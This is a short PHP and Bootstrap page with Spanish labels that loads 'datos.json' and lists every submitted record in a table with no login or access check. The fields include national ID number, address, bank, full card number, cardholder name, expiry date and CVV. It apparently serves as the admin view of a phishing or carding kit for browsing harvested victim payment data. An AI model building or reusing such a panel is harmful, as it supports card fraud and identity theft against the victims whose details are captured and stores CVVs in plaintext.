<?php
// Cargar el archivo JSON
$json_file = 'datos.json';

// Verificar si el archivo JSON existe
if (file_exists($json_file)) {
    // Obtener el contenido del archivo JSON
    $json_data = file_get_contents($json_file);
    // Decodificar los datos JSON
    $datos = json_decode($json_data, true);
} else {
    // Si el archivo no existe, mostrar un mensaje de error
    $datos = [];
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visualización de Datos</title>
    
    <!-- Bootstrap 5 CDN -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <style>
        body {
            background: #f4f6f8;
            font-family: 'Segoe UI', sans-serif;
        }
        h1 {
            text-align: center;
            margin: 40px 0 20px;
            color: #333;
            font-weight: 700;
        }
        .table-container {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 0 20px rgba(0,0,0,0.05);
            overflow-x: auto;
        }
        table {
            border-radius: 10px;
            overflow: hidden;
        }
        thead {
            background: #007bff;
            color: white;
        }
        th {
            white-space: nowrap;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        tr:hover {
            background-color: #e9f3ff;
        }
        @media (max-width: 768px) {
            h1 {
                font-size: 1.8rem;
            }
            .table-container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>

    <div class="container-fluid">
        <h1>📋 Datos del Formulario</h1>

        <?php if (empty($datos)): ?>
            <div class="alert alert-warning text-center mt-4">
                No hay datos disponibles en el archivo JSON.
            </div>
        <?php else: ?>
            <div class="table-container mt-4">
                <div class="table-responsive">
                    <table class="table table-bordered table-striped align-middle">
                        <thead>
                            <tr>
                                <th>Nombre</th>
                                <th>Apellido</th>
                                <th>Documento</th>
                                <th>Teléfono</th>
                                <th>Ciudad</th>
                                <th>Dirección</th>
                                <th>Email</th>
                                <th>Banco</th>
                                <th>Franquicia</th>
                                <th>Tipo de Tarjeta</th>
                                <th>Número de Tarjeta</th>
                                <th>Nombre en la Tarjeta</th>
                                <th>Mes de Vencimiento</th>
                                <th>Año de Vencimiento</th>
                                <th>CVV</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($datos as $dato): ?>
                                <tr>
                                    <td><?= htmlspecialchars($dato['nombre']) ?></td>
                                    <td><?= htmlspecialchars($dato['apellido']) ?></td>
                                    <td><?= htmlspecialchars($dato['documento']) ?></td>
                                    <td><?= htmlspecialchars($dato['telefono']) ?></td>
                                    <td><?= htmlspecialchars($dato['ciudad']) ?></td>
                                    <td><?= htmlspecialchars($dato['direccion']) ?></td>
                                    <td><?= htmlspecialchars($dato['email']) ?></td>
                                    <td><?= htmlspecialchars($dato['banco']) ?></td>
                                    <td><?= htmlspecialchars($dato['franquicia']) ?></td>
                                    <td><?= htmlspecialchars($dato['tipo_tarjeta']) ?></td>
                                    <td><?= htmlspecialchars($dato['nro_tarjeta']) ?></td>
                                    <td><?= htmlspecialchars($dato['nombre_tarjeta']) ?></td>
                                    <td><?= htmlspecialchars($dato['mes_tarjeta']) ?></td>
                                    <td><?= htmlspecialchars($dato['anio_tarjeta']) ?></td>
                                    <td><?= htmlspecialchars($dato['cvv_tarjeta']) ?></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
